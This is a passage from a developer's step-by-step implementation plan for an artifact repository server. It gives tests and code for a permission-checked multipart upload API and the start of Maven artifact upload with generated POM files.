    added = await client.post(UPLOAD, files=parts(("a.txt", b"one")), headers=adder)
    replaced = await client.post(UPLOAD, files=parts(("a.txt", b"two")), headers=adder)
    fetched = await client.get("/repository/files/a.txt", headers=root)

    assert added.status_code == 201, added.text
    assert added.json()["files"][0]["path"] == "a.txt"  # with no right to browse or to read
    assert (replaced.status_code, error_code(replaced)) == (403, "forbidden")
    assert fetched.content == b"one"


async def test_edit_alone_replaces_and_does_not_add(client, files, db, make_user, root):
    await client.post(UPLOAD, files=parts(("a.txt", b"one")), headers=root)
    editor = await someone_who_may(db, make_user, "edit")

    replaced = await client.post(UPLOAD, files=parts(("a.txt", b"two")), headers=editor)
    added = await client.post(UPLOAD, files=parts(("b.txt", b"new")), headers=editor)

    assert replaced.status_code == 201, replaced.text
    assert (added.status_code, error_code(added)) == (403, "forbidden")
    assert await held(client, root) == ["a.txt"]


async def test_reading_and_browsing_are_not_uploading(client, files, db, make_user, settings):
    reader = await someone_who_may(db, make_user, "browse", "read", "delete")

    refused = await client.post(UPLOAD, files=parts(("a.txt", BIG)), headers=reader)
    nobody = await client.post(UPLOAD, files=parts(("a.txt", b"x")))

    assert (refused.status_code, error_code(refused)) == (403, "forbidden")
    assert nobody.status_code == 401
    assert temporary_files(settings) == []


async def test_a_visitor_who_may_add_is_asked_to_sign_in_the_way_the_api_asks(
    client, files, db, root
):
    await client.post(UPLOAD, files=parts(("a.txt", b"held")), headers=root)
    await roles.create_role(db, "drop", "", ["repository:raw:files:add"], [])
    await db.commit()
    await users.set_roles(db, await users.get_user_by_username(db, "anonymous"), ["drop"])
    await set_setting(db, "anonymous_access", {"enabled": True})
    await db.commit()

    added = await client.post(UPLOAD, files=parts(("b.txt", b"new")))
    replaced = await client.post(UPLOAD, files=parts(("a.txt", b"other")))

    assert added.status_code == 201, added.text
    assert replaced.status_code == 401
    # Not `Basic`, which a browser answers with a dialog of its own.
    assert replaced.headers["WWW-Authenticate"].startswith("Bearer")


async def test_a_read_only_repository_refuses_before_anything_is_read(client, root, db, settings):
    await service.create_repository(
        db,
        name="frozen",
        format="raw",
        type="hosted",
        online=True,
        blob_store="default",
        hosted={"deployment_policy": "read_only"},
        format_config={},
    )
    await db.commit()

    response = await client.post(
        "/api/v1/content/frozen/upload", files=parts(("a.txt", b"x")), headers=root
    )

    assert (response.status_code, error_code(response)) == (403, "repository_read_only")
    assert temporary_files(settings) == []


async def test_an_offline_repository_is_still_filled_by_whoever_tends_it(client, files, root, db):
    files.online = False
    await db.commit()

    response = await client.post(UPLOAD, files=parts(("a.txt", b"x")), headers=root)
    by_client = await client.put("/repository/files/b.txt", content=b"x", headers=root)

    assert response.status_code == 201, response.text
    assert (by_client.status_code, error_code(by_client)) == (503, "repository_offline")


async def test_only_a_hosted_repository_takes_an_upload(client, files, mirror, root, db):
    await service.create_repository(
        db,
        name="all",
        format="raw",
        type="group",
        online=True,
        blob_store=None,
        group={"members": ["files"]},
    )
    await db.commit()

    proxy = await client.post(
        "/api/v1/content/mirror/upload", files=parts(("a.txt", b"x")), headers=root
    )
    group = await client.post(
        "/api/v1/content/all/upload", files=parts(("a.txt", b"x")), headers=root
    )

    for response in (proxy, group):
        assert (response.status_code, error_code(response)) == (409, "upload_not_supported")
    assert "hosted" in proxy.json()["error"]["message"]
    assert await held(client, root) == []


async def test_an_image_is_not_uploaded(client, root, db):
    await service.create_repository(
        db,
        name="images",
        format="docker",
        type="hosted",
        online=True,
        blob_store="default",
        format_config={},
    )
    await db.commit()

    response = await client.post(
        "/api/v1/content/images/upload", files=parts(("image.tar", b"x")), headers=root
    )

    assert (response.status_code, error_code(response)) == (409, "upload_not_supported")
    assert "container client" in response.json()["error"]["message"]


async def test_there_is_no_uploading_to_a_repository_that_is_not_there(client, root):
    response = await client.post(
        "/api/v1/content/nowhere/upload", files=parts(("a.txt", b"x")), headers=root
    )

    assert (response.status_code, error_code(response)) == (404, "not_found")


async def test_no_database_connection_is_held_while_the_form_arrives(
    client, files, root, db, monkeypatch
):
    in_transaction = []
    read = forms.read

    async def watched(*arguments, **named):
        in_transaction.append(db.in_transaction())
        return await read(*arguments, **named)

    monkeypatch.setattr(forms, "read", watched)

    response = await client.post(UPLOAD, files=parts(("a.txt", b"x")), headers=root)

    assert response.status_code == 201, response.text
    assert in_transaction == [False]
```

Add to the end of `backend/tests/storage/test_backends.py`:

```python
async def test_discarding_what_has_been_committed_does_nothing(backend, tmp_path):
    first = await backend.stage(pieces(BODY))
    again = await backend.stage(pieces(BODY))  # the same content, staged a second time

    await backend.commit(first)
    await backend.discard(first)
    await backend.commit(again)
    await backend.discard(again)

    assert await read(backend, first.sha256) == BODY
    assert temporary_files(tmp_path / "store") == []
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/repositories/test_content_upload.py tests/storage/test_backends.py tests/test_route_guards.py -q`
Expected: 33 failed, 43 passed. Every upload answers `404` or `405`: there is no such route.

- [ ] **Step 3: Implement**

In `backend/src/megooarti/storage/backends.py`:

Replace

```python
class BlobBackend(Protocol):
    async def stage(self, chunks: AsyncIterator[bytes]) -> StagedBlob: ...

    async def commit(self, staged: StagedBlob) -> None: ...

    async def discard(self, staged: StagedBlob) -> None: ...
```

with

```python
class BlobBackend(Protocol):
    async def stage(self, chunks: AsyncIterator[bytes]) -> StagedBlob: ...

    async def commit(self, staged: StagedBlob) -> None: ...

    async def discard(self, staged: StagedBlob) -> None:
        """Drop staged content. For what has been committed since, this does nothing."""
```

In `backend/src/megooarti/repositories/content.py`:

Replace

```python
    async def discard(self, staged: StagedBlob) -> None:
        """Drop staged content that will not be stored after all."""
```

with

```python
    async def discard(self, staged: StagedBlob) -> None:
        """Drop staged content that will not be stored after all.

        For content that was stored after it was staged, this does nothing: whoever
        staged several files can give all of them back without asking which were kept.
        """
```

In `backend/src/megooarti/repositories/formats.py`:

Replace

```python
from collections.abc import Awaitable, Callable
```

with

```python
from collections.abc import Awaitable, Callable, Collection
```

Replace

```python
from megooarti.errors import ApiError

if TYPE_CHECKING:
    from megooarti.repositories.content import RepositoryContext
```

with

```python
from megooarti.errors import ApiError
from megooarti.repositories.paths import normalise_path

if TYPE_CHECKING:
    from megooarti.repositories.content import RepositoryContext
    from megooarti.repositories.forms import UploadForm
```

After

```python
def managed_by_format(reason: str) -> ApiError:
    """The refusal to delete, on its own, a file that a format keeps itself."""
    return ApiError(409, "managed_by_format", reason)
```

add

```python
def invalid_upload(field: str, message: str) -> ApiError:
    """The refusal of an upload form that lacks, or has wrong, what its format needs."""
    details = [{"field": field, "message": message}]
    return ApiError(422, "validation_error", "The request is not valid.", details)


def only_fields(form: "UploadForm", known: Collection[str]) -> None:
    """Refuse a form with a field its format has no use for: most often one misspelt."""
    for name in form.fields:
        if name not in known:
            raise invalid_upload(
                name,
                "This is not a field of an upload to this repository. If it is meant as a "
                "file, it must be sent as one, with a file name.",
            )
```

After

```python
    # listed as components and not found by search.
    unlisted_namespaces: frozenset[str] = frozenset()
```

add

```python
    # Why a hosted repository of this format takes no upload through the API, if it
    # takes none: what its users are told to do instead.
    no_upload: str | None = None
```

Before

```python
    def download_path(self, repository: str, path: str) -> str | None:
```

add

```python
    async def upload(self, context: "RepositoryContext", form: "UploadForm") -> list[str]:
        """Store what an upload form carries, as this format's own client's upload would.

        Returns the paths of the files stored. Raises `invalid_upload` for a form that
        lacks what the format needs. The repository is hosted, and the caller may add
        to it or edit it; the facade checks each file as it is stored. Whatever of the
        form is not stored, the caller discards, and the caller commits: for the upload
        to be all or nothing, nothing here may commit once a file has been stored.

        The generic format: a `directory`, and each `file` stored in it by its name.
        """
        only_fields(form, ("directory",))
        if not form.files:
            raise invalid_upload("file", "At least one file is needed.")
        directory = form.fields.get("directory", "").strip("/")
        targets = []
        for file in form.files:
            if file.field != "file":
                raise invalid_upload(file.field, "A file is sent as `file`.")
            if "/" in file.filename or "\\" in file.filename:
                raise invalid_upload("file", f"A file's name cannot hold a slash: {file.filename}")
            path = normalise_path(f"{directory}/{file.filename}" if directory else file.filename)
            if path in targets:
                raise invalid_upload("file", f"Two files are named {file.filename}.")
            targets.append(path)
        for path, file in zip(targets, form.files, strict=True):
            await context.store(path, file.staged, content_type=self.content_type(path, None))
        return targets
```

In `backend/src/megooarti/repositories/docker/format.py`:

After

```python
    unlisted_namespaces = frozenset({names.MANIFESTS})
```

add

```python
    no_upload = "An image is pushed with a container client, not uploaded."
```

In `backend/src/megooarti/repositories/content_api.py`:

Replace

```python
`/api/v1/repositories` configures repositories and is an administrator's. This is for
everyone else: which repositories there are to use, what is in them as folders, files
and components, and removing things. Seeing anything needs `browse` on the repository;
downloading goes through the content route and needs `read`, as it always has.
"""
```

with

```python
`/api/v1/repositories` configures repositories and is an administrator's. This is for
everyone else: which repositories there are to use, what is in them as folders, files
and components, removing things and uploading them. Seeing anything needs `browse` on
the repository; downloading goes through the content route and needs `read`, as it
always has; uploading needs `add`, or `edit` to replace, and nothing else.
"""
```

Replace

```python
from typing import Annotated
from urllib.parse import urlsplit

from fastapi import APIRouter, Depends, Query, Request
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import AsyncSession
```

with

```python
from typing import Annotated
from urllib.parse import urlsplit

import structlog
from fastapi import APIRouter, Depends, Query, Request
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import AsyncSession
from starlette.requests import ClientDisconnect
from starlette.responses import Response
```

Replace

```python
from megooarti.repositories import browse, service
```

with

```python
from megooarti.repositories import browse, forms, service
```

Replace

```python
from megooarti.security.authentication import Principal, authorize, require_caller
from megooarti.system.settings_store import get_setting

router = APIRouter(prefix="/content", tags=["content"])
```

with

```python
from megooarti.security.authentication import (
    Principal,
    authorize,
    require_caller,
    unauthorized,
)
from megooarti.system.settings_store import get_setting

log = structlog.get_logger(__name__)

router = APIRouter(prefix="/content", tags=["content"])
```

After

```python
class ComponentDetail(ComponentView):
    files: list[Entry]
```

add

```python
class Uploaded(BaseModel):
    components: list[ComponentRef]  # what the files belong to, each once
    files: list[AssetView]
```

Replace

```python
    address = handler.download_path(found.name, detail.path)
    download = None if address is None else await _base(request, db) + address
    return AssetView.model_validate({**vars(detail), "download": download}, from_attributes=True)
```

with

```python
    return _asset_view(found, handler, detail, await _base(request, db))
```

After

```python
def _entry(child: browse.Child) -> Entry:
    return Entry.model_validate(child, from_attributes=True)
```

add

```python
def _asset_view(
    repository: Repository, handler: Format, detail: browse.AssetDetail, base: str
) -> AssetView:
    address = handler.download_path(repository.name, detail.path)
    download = None if address is None else base + address
    return AssetView.model_validate({**vars(detail), "download": download}, from_attributes=True)
```

Add to the end of `backend/src/megooarti/repositories/content_api.py`:

```python
# --- Uploading ------------------------------------------------------------------------

_NO_UPLOAD = {
    "proxy": "A proxy holds what its remote has. Upload to a hosted repository.",
    "group": "A group holds nothing of its own. Upload to one of its hosted members.",
}


def _not_readable(reason: object) -> ApiError:
    details = [{"field": "body", "message": f"The form cannot be read: {reason}."}]
    return ApiError(422, "validation_error", f"The form cannot be read: {reason}.", details)


@router.post("/{repository}/upload", response_model=Uploaded, status_code=201)
async def upload(
    repository: str,
    request: Request,
    caller: Principal = Depends(require_caller),
    db: AsyncSession = Depends(get_session),
) -> Uploaded | Response:
    """Upload to a hosted repository with a `multipart/form-data` form.

    The fields are those of the repository's format. Everything in the form is stored,
    or nothing is. Like the rest of this API it works on a repository that is offline:
    that stops package clients, not the people who tend the repository.
    """
    found = await service.get_repository(db, repository)
    if found is None:
        raise ApiError(404, "not_found", "No such repository.")
    try:
        authorize(caller, _permission(found, "add"))
    except ApiError:
        authorize(caller, _permission(found, "edit"))
    handler = _handler(found)
    refusal = _NO_UPLOAD.get(found.type) or handler.no_upload
    if refusal is not None:
        raise ApiError(409, "upload_not_supported", refusal)
    context = await build_context(db, request.app.state.settings, found, caller)
    context.require_write()  # a read-only repository is refused before the body is read
    base = await _base(request, db)
    await context.release()  # the form needs no connection while it arrives

    try:
        form = await forms.read(
            request.stream(),
            request.headers.get("Content-Type", ""),
            stage=context.stage,
            discard=context.discard,
        )
    except forms.InvalidForm as error:
        raise _not_readable(error) from None
    except ClientDisconnect:
        # The client went away mid-upload. Nothing was stored; nobody is left to answer.
        log.info("upload_interrupted", repository=repository)
        return Response(status_code=400)
    try:
        try:
            stored = await handler.upload(context, form)
        except ApiError as error:
            if error.status_code == 401:
                # The facade asks as a package client is asked, and a browser answers
                # that with a dialog of its own.
                raise unauthorized() from None
            raise
        files = []
        for path in stored:
            detail = await browse.asset(db, found, path, unlisted=handler.unlisted_namespaces)
            if detail is not None:
                files.append(_asset_view(found, handler, detail, base))
        components = {file.component.id: file.component for file in files if file.component}
        await db.commit()
    finally:
        # What was stored is no longer staged, and giving it back does nothing.
        for file in form.files:
            await context.discard(file.staged)
    return Uploaded(components=list(components.values()), files=files)
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `uv run pytest tests/repositories/test_content_upload.py tests/storage/test_backends.py tests/test_route_guards.py -q`
Expected: 76 passed.

- [ ] **Step 5: Commit**

```bash
git add backend/src/megooarti backend/tests/repositories/test_content_upload.py backend/tests/storage/test_backends.py
git commit -m "feat(content): upload to a hosted repository through the API"
```

---

### Task 3: Maven: an artifact by its coordinates, with a POM written for it

**Files:**
- Create: `backend/src/megooarti/repositories/maven/upload.py`
- Modify: `backend/src/megooarti/repositories/maven/format.py`
- Test: `backend/tests/repositories/maven/test_upload.py`
- Test: `backend/tests/repositories/maven/test_content_upload.py`

**Interfaces:**
- Consumes: `Format.upload`, `invalid_upload`, `UploadForm` (Tasks 1 and 2); `paths.classify`, `_excluded`; `context.store`, `stat`, `stage_bytes`.
- Produces:
  - `upload.plan(fields, files: Sequence[tuple[part name, file name]]) -> Plan(paths, pom_path, pom)`; `upload.InvalidUpload` with a `field`.
  - `upload.extension_of(filename) -> str | None`; `upload.generated_pom(group, artifact, version, packaging) -> bytes`.
  - `MavenFormat.upload`.

- [ ] **Step 1: Write the failing tests**

`backend/tests/repositories/maven/test_upload.py`:

```python
"""A Maven upload form, turned into the files it asks to be stored."""

import xml.etree.ElementTree as ElementTree

import pytest

from megooarti.repositories.maven import upload
from megooarti.repositories.maven.upload import InvalidUpload

APP = {"group": "com.acme", "artifact": "app", "version": "1.0"}
POM = "{http://maven.apache.org/POM/4.0.0}"


def test_an_artifact_goes_where_its_coordinates_say_and_gets_a_pom():
    planned = upload.plan(APP, [("file", "whatever-it-was-called.jar")])

    assert planned.paths == ("com/acme/app/1.0/app-1.0.jar",)
    assert planned.pom_path == "com/acme/app/1.0/app-1.0.pom"
    project = ElementTree.fromstring(planned.pom)
    said = {child.tag.removeprefix(POM): child.text for child in project}
    assert said == {
        "modelVersion": "4.0.0",
        "groupId": "com.acme",
        "artifactId": "app",
        "version": "1.0",
        "packaging": "jar",
    }


def test_each_part_says_what_its_file_is():
    planned = upload.plan(
        APP,
        [
            ("file", "app.jar"),
            ("file.sources", "app-sources.jar"),
            ("file.javadoc", "docs.jar"),
            ("file.linux-x86_64", "app.tar.gz"),
            ("pom", "pom.xml"),
        ],
    )

    assert [path.rpartition("/")[2] for path in planned.paths] == [
        "app-1.0.jar",
        "app-1.0-sources.jar",
        "app-1.0-javadoc.jar",
        "app-1.0-linux-x86_64.tar.gz",
        "app-1.0.pom",
    ]
    assert planned.pom is None  # one was sent


@pytest.mark.parametrize(
    ("filename", "extension"),
    [
        ("app.jar", "jar"),
        ("app-1.0.war", "war"),
        ("app-1.0.tar.gz", "tar.gz"),
        ("APP.TAR.GZ", "TAR.GZ"),
        ("app.tar.bz2", "tar.bz2"),
        ("app.jar.asc", "jar.asc"),
        ("app.tar.gz.asc", "tar.gz.asc"),
        ("app.module", "module"),
        ("pom.xml", "xml"),
        ("jar", None),
        (".jar", None),
        ("app.", None),
        (".tar.gz", "gz"),
        (".asc", None),
    ],
)
def test_the_end_of_a_name_says_what_a_file_is(filename, extension):
    assert upload.extension_of(filename) == extension


def test_a_pom_is_not_written_when_one_is_sent_or_none_is_wanted():
    as_pom = upload.plan(APP, [("file", "app.jar"), ("pom", "pom.xml")])
    as_file = upload.plan(APP, [("file", "app-1.0.pom")])
    unwanted = upload.plan({**APP, "generate_pom": "False"}, [("file", "app.jar")])

    assert (as_pom.pom, as_file.pom, unwanted.pom) == (None, None, None)
    assert as_file.paths == (as_file.pom_path,)


def test_the_pom_says_the_packaging_that_was_given():
    planned = upload.plan({**APP, "packaging": "war"}, [("file", "app.war")])

    assert b"<packaging>war</packaging>" in planned.pom
    assert planned.paths == ("com/acme/app/1.0/app-1.0.war",)


def test_a_snapshot_is_stored_under_its_plain_name():
    planned = upload.plan({**APP, "version": "1.0-SNAPSHOT"}, [("file.sources", "s.jar")])

    assert planned.paths == ("com/acme/app/1.0-SNAPSHOT/app-1.0-SNAPSHOT-sources.jar",)


def test_what_is_given_is_trimmed():
    planned = upload.plan(
        {"group": " com.acme ", "artifact": "app\n", "version": " 1.0", "packaging": " "},
        [("file", "app.jar")],
    )

    assert planned.paths == ("com/acme/app/1.0/app-1.0.jar",)
    assert b"<packaging>jar</packaging>" in planned.pom


@pytest.mark.parametrize(
    ("changes", "files", "field"),
    [
        ({"group": ""}, [("file", "a.jar")], "group"),
        ({"group": None}, [("file", "a.jar")], "group"),
        ({"artifact": None}, [("file", "a.jar")], "artifact"),
        ({"version": None}, [("file", "a.jar")], "version"),
        ({"group": "com..acme"}, [("file", "a.jar")], "group"),
        ({"group": ".com"}, [("file", "a.jar")], "group"),
        ({"group": "com/acme"}, [("file", "a.jar")], "group"),
        ({"group": "com.acme."}, [("file", "a.jar")], "group"),
        ({"artifact": "app/1"}, [("file", "a.jar")], "artifact"),
        ({"artifact": "app name"}, [("file", "a.jar")], "artifact"),
        ({"artifact": "<app>"}, [("file", "a.jar")], "artifact"),
        ({"version": ".."}, [("file", "a.jar")], "version"),
        ({"version": "1/0"}, [("file", "a.jar")], "version"),
        ({"version": "-SNAPSHOT"}, [("file", "a.jar")], "file"),
        ({"version": "1" * 256}, [("file", "a.jar")], "file"),
        ({"packaging": "a b"}, [("file", "a.jar")], "packaging"),
        ({"generate_pom": "maybe"}, [("file", "a.jar")], "generate_pom"),
        ({"classifier": "sources"}, [("file", "a.jar")], "classifier"),
        ({}, [], "file"),
        ({}, [("file", "README")], "file"),
        ({}, [("file", "a.j@r")], "file"),
        ({}, [("upload", "a.jar")], "upload"),
        ({}, [("file.", "a.jar")], "file."),
        ({}, [("file.a.b", "a.jar")], "file.a.b"),
        ({}, [("file.so/urces", "a.jar")], "file.so/urces"),
        ({}, [("pom.extra", "a.pom")], "pom.extra"),
        ({}, [("file", "a.jar"), ("file", "b.jar")], "file"),
        ({}, [("file", "a.pom"), ("pom", "pom.xml")], "pom"),
        ({}, [("pom", "a.xml"), ("pom", "b.xml")], "pom"),
        ({}, [("file.x", "a.jar"), ("file.x", "b.jar")], "file.x"),
    ],
)
def test_a_form_that_does_not_say_what_to_store_is_refused_at_the_field(changes, files, field):
    fields = {name: value for name, value in {**APP, **changes}.items() if value is not None}

    with pytest.raises(InvalidUpload) as refused:
        upload.plan(fields, files)

    assert refused.value.field == field


def test_two_kinds_of_one_artifact_can_come_together():
    planned = upload.plan(APP, [("file", "a.jar"), ("file", "a.zip"), ("file.x", "a.zip")])

    assert len(set(planned.paths)) == 3
```

`backend/tests/repositories/maven/test_content_upload.py`:

```python
"""Uploading to a Maven repository through the content API leaves it as a deploy would."""

import hashlib

from tests.accounts import error_code
from tests.repositories.maven.conftest import create

UPLOAD = "/api/v1/content/releases/upload"
APP = {"group": "com.acme", "artifact": "app", "version": "1.0"}
HELD = "/repository/releases/com/acme/app"
JAR = b"PK\x03\x04 pretend this is a jar"


def parts(*files: tuple[str, str, bytes]) -> list:
    return [(field, (name, data)) for field, name, data in files]


async def send(client, root, fields: dict, *files: tuple[str, str, bytes], to: str = UPLOAD):
    return await client.post(to, data=fields, files=parts(*files), headers=root)


async def test_an_uploaded_artifact_is_there_for_a_build_to_use(client, releases, root):
    response = await send(client, root, APP, ("file", "build-output.jar", JAR))
    jar = await client.get(f"{HELD}/1.0/app-1.0.jar", headers=root)
    pom = await client.get(f"{HELD}/1.0/app-1.0.pom", headers=root)
    sha1 = await client.get(f"{HELD}/1.0/app-1.0.jar.sha1", headers=root)
    metadata = await client.get(f"{HELD}/maven-metadata.xml", headers=root)

    assert response.status_code == 201, response.text
    stored = response.json()
    assert [file["path"] for file in stored["files"]] == [
        "com/acme/app/1.0/app-1.0.jar",
        "com/acme/app/1.0/app-1.0.pom",
    ]
    assert [(c["namespace"], c["name"], c["version"]) for c in stored["components"]] == [
        ("com.acme", "app", "1.0")
    ]
    assert (jar.content, jar.headers["Content-Type"]) == (JAR, "application/java-archive")
    assert "<artifactId>app</artifactId>" in pom.text and "<packaging>jar</packaging>" in pom.text
    assert pom.headers["Content-Type"] == "application/xml"
    assert sha1.text == hashlib.sha1(JAR).hexdigest()
    assert "<version>1.0</version>" in metadata.text


async def test_a_pom_that_is_sent_is_the_one_kept(client, releases, root):
    own = b"<project><modelVersion>4.0.0</modelVersion><name>Ours</name></project>"

    response = await send(
        client,
        root,
        APP,
        ("file", "app.jar", JAR),
        ("file.sources", "app-sources.jar", b"sources"),
        ("pom", "pom.xml", own),
    )
    pom = await client.get(f"{HELD}/1.0/app-1.0.pom", headers=root)
    sources = await client.get(f"{HELD}/1.0/app-1.0-sources.jar", headers=root)

    assert response.status_code == 201, response.text
    assert len(response.json()["files"]) == 3 and len(response.json()["components"]) == 1
    assert (pom.content, sources.content) == (own, b"sources")


async def test_no_pom_is_written_for_whoever_wants_none(client, releases, root):
    response = await send(client, root, {**APP, "generate_pom": "false"}, ("file", "app.jar", JAR))
    pom = await client.get(f"{HELD}/1.0/app-1.0.pom", headers=root)

    assert response.status_code == 201, response.text
    assert pom.status_code == 404


async def test_a_file_added_to_a_version_leaves_its_pom_alone(client, db, root):
    await create(db, "once", hosted={"deployment_policy": "disable_redeploy"})
    address = "/api/v1/content/once/upload"
    own = b"<project><modelVersion>4.0.0</modelVersion><name>Ours</name></project>"
    first = await send(
        client, root, APP, ("file", "app.jar", JAR), ("pom", "pom.xml", own), to=address
    )

    later = await send(client, root, APP, ("file.sources", "s.jar", b"sources"), to=address)
    pom = await client.get("/repository/once/com/acme/app/1.0/app-1.0.pom", headers=root)

    assert (first.status_code, later.status_code) == (201, 201), later.text
    assert [file["path"] for file in later.json()["files"]] == [
        "com/acme/app/1.0/app-1.0-sources.jar"
    ]
    assert pom.content == own


async def test_what_is_held_is_not_replaced_where_that_is_not_allowed(client, db, root):
    await create(db, "once", hosted={"deployment_policy": "disable_redeploy"})
    address = "/api/v1/content/once/upload"
    await send(client, root, APP, ("file", "app.jar", JAR), to=address)

    again = await send(
        client, root, APP, ("file.sources", "s.jar", b"new"), ("file", "app.jar", b"x"), to=address
    )
    jar = await client.get("/repository/once/com/acme/app/1.0/app-1.0.jar", headers=root)
    sources = await client.get(
        "/repository/once/com/acme/app/1.0/app-1.0-sources.jar", headers=root
    )

    assert (again.status_code, error_code(again)) == (409, "redeploy_disabled")
    assert (jar.content, sources.status_code) == (JAR, 404)  # all of the upload, or none


async def test_a_repository_takes_the_versions_its_policy_says(client, releases, snapshots, root):
    snapshot = {**APP, "version": "1.0-SNAPSHOT"}

    refused = await send(client, root, snapshot, ("file", "app.jar", JAR))
    wrong = await send(
        client, root, APP, ("file", "app.jar", JAR), to="/api/v1/content/snapshots/upload"
    )
    taken = await send(
        client, root, snapshot, ("file", "app.jar", JAR), to="/api/v1/content/snapshots/upload"
    )
    listed = await client.get(
        "/repository/snapshots/com/acme/app/1.0-SNAPSHOT/maven-metadata.xml", headers=root
    )
    jar = await client.get(
        "/repository/snapshots/com/acme/app/1.0-SNAPSHOT/app-1.0-SNAPSHOT.jar", headers=root
    )

    for response in (refused, wrong):
        assert (response.status_code, error_code(response)) == (400, "version_policy_violation")
    assert taken.status_code == 201, taken.text
    assert "<version>1.0-SNAPSHOT</version>" in listed.text
    assert jar.content == JAR


async def test_a_form_that_does_not_say_what_to_store_is_refused(client, releases, root):
    no_version = await send(
        client, root, {"group": "com.acme", "artifact": "app"}, ("file", "a.jar", JAR)
    )
    no_kind = await send(client, root, APP, ("file", "README", b"text"))
    misspelt = await send(client, root, {**APP, "clasifier": "x"}, ("file", "a.jar", JAR))
    tree = await client.get("/api/v1/content/releases/tree", headers=root)

    for response, field in ((no_version, "version"), (no_kind, "file"), (misspelt, "clasifier")):
        assert (response.status_code, error_code(response)) == (422, "validation_error")
        assert [detail["field"] for detail in response.json()["error"]["details"]] == [field]
    assert tree.json()["items"] == []
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/repositories/maven/test_upload.py tests/repositories/maven/test_content_upload.py -q`
Expected: collection error, `cannot import name 'upload' from 'megooarti.repositories.maven'`.

- [ ] **Step 3: Implement**

`backend/src/megooarti/repositories/maven/upload.py`:

```python
"""An upload form for a Maven repository, turned into the files it asks to be stored.

Pure functions: no database, no files. The form gives the coordinates once; each file
says what it is by the name of its part and the end of its own name:

    file               the artifact itself            app-1.0.jar
    file.<classifier>  a file beside it               app-1.0-sources.jar
    pom                the POM, whatever it is named  app-1.0.pom
"""

import re
from collections.abc import Mapping, Sequence
from dataclasses import dataclass
from xml.sax.saxutils import escape

from megooarti.repositories.maven import paths

FIELDS = ("group", "artifact", "version", "packaging", "generate_pom")
_ID = re.compile(r"[A-Za-z0-9_-]+(?:\.[A-Za-z0-9_-]+)*")
_VERSION = re.compile(r"[A-Za-z0-9_.+-]+")
_CLASSIFIER = re.compile(r"[A-Za-z0-9_-]+")
_EXTENSION = re.compile(r"[A-Za-z0-9]+(?:\.[A-Za-z0-9]+)*")
# Ends of a name that are one extension though they have a dot in them.
_COMPOUND = ("tar.gz", "tar.bz2", "tar.xz", "tar.zst")
_SIGNATURE = ".asc"
_BOOLEANS = {"true": True, "false": False}


class InvalidUpload(Exception):
    """The form does not say what to store. `field` is where, and the message says why."""

    def __init__(self, field: str, message: str) -> None:
        super().__init__(message)
        self.field = field


@dataclass(frozen=True)
class Plan:
    paths: tuple[str, ...]  # where each file of the form goes, in the form's order
    pom_path: str  # where this version's POM is
    pom: bytes | None  # a POM to store there if the repository has none: None if one was sent


def extension_of(filename: str) -> str | None:
    """What a file is, by the end of its name: `jar`, `tar.gz`, `jar.asc`. None if nothing."""
    if filename.lower().endswith(_SIGNATURE):
        signed = extension_of(filename[: -len(_SIGNATURE)])
        return None if signed is None else f"{signed}{filename[-len(_SIGNATURE) :]}"
    for compound in _COMPOUND:
        if filename.lower().endswith(f".{compound}") and len(filename) > len(compound) + 1:
            return filename[-len(compound) :]
    stem, dot, extension = filename.rpartition(".")
    return extension if dot and stem and extension else None


def generated_pom(group: str, artifact: str, version: str, packaging: str) -> bytes:
    """The least a POM can say: what this is. Enough for a build that depends on it."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<project xmlns="http://maven.apache.org/POM/4.0.0"'
        ' xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"'
        ' xsi:schemaLocation="http://maven.apache.org/POM/4.0.0'
        ' https://maven.apache.org/xsd/maven-4.0.0.xsd">\n'
        "  <modelVersion>4.0.0</modelVersion>\n"
        f"  <groupId>{escape(group)}</groupId>\n"
        f"  <artifactId>{escape(artifact)}</artifactId>\n"
        f"  <version>{escape(version)}</version>\n"
        f"  <packaging>{escape(packaging)}</packaging>\n"
        "</project>\n"
    ).encode()


def _coordinate(fields: Mapping[str, str], name: str, pattern: re.Pattern[str]) -> str:
    value = fields.get(name, "").strip()
    if not value:
        raise InvalidUpload(name, "This is needed.")
    if not pattern.fullmatch(value) or value in (".", ".."):
        raise InvalidUpload(name, "This has a character, or a form, that Maven does not take.")
    return value


def _target(part: str, filename: str) -> tuple[str, str]:
    """The classifier and the extension a part of the form asks for."""
    if part == "pom":
        return "", "pom"
    name, dot, classifier = part.partition(".")
    if name != "file" or (dot and not _CLASSIFIER.fullmatch(classifier)):
        raise InvalidUpload(part, "A file is sent as `file`, `file.<classifier>` or `pom`.")
    extension = extension_of(filename)
    if extension is None or not _EXTENSION.fullmatch(extension):
        raise InvalidUpload(part, f"The name {filename} does not end in what the file is.")
    return classifier, extension


def plan(fields: Mapping[str, str], files: Sequence[tuple[str, str]]) -> Plan:
    """Where the files of a form go. `files` are (part name, file name). Raises InvalidUpload."""
    for name in fields:
        if name not in FIELDS:
            raise InvalidUpload(name, "This is not a field of an upload to a Maven repository.")
    group = _coordinate(fields, "group", _ID)
    artifact = _coordinate(fields, "artifact", _ID)
    version = _coordinate(fields, "version", _VERSION)
    packaging = fields.get("packaging", "").strip() or "jar"
    if not _ID.fullmatch(packaging):
        raise InvalidUpload("packaging", "This is not a packaging.")
    generate = _BOOLEANS.get(fields.get("generate_pom", "true").strip().lower())
    if generate is None:
        raise InvalidUpload("generate_pom", "Must be true or false.")
    if not files:
        raise InvalidUpload("file", "At least one file is needed.")

    directory = f"{group.replace('.', '/')}/{artifact}/{version}"
    targets: list[str] = []
    for part, filename in files:
        classifier, extension = _target(part, filename)
        suffix = f"-{classifier}" if classifier else ""
        path = f"{directory}/{artifact}-{version}{suffix}.{extension}"
        parsed = paths.classify(path)
        read = (parsed.group_id, parsed.artifact_id, parsed.version, parsed.classifier)
        if parsed.kind != "artifact" or read != (group, artifact, version, classifier):
            # Everything else reads a path to know what a file is, so the path must
            # read back as what was given: a version of `-SNAPSHOT` alone does not.
            raise InvalidUpload(part, "The group, artifact and version do not make a Maven path.")
        if path in targets:
            raise InvalidUpload(part, f"Two files of the form would be {path.rpartition('/')[2]}.")
        targets.append(path)
    pom_path = f"{directory}/{artifact}-{version}.pom"
    wanted = generate and pom_path not in targets
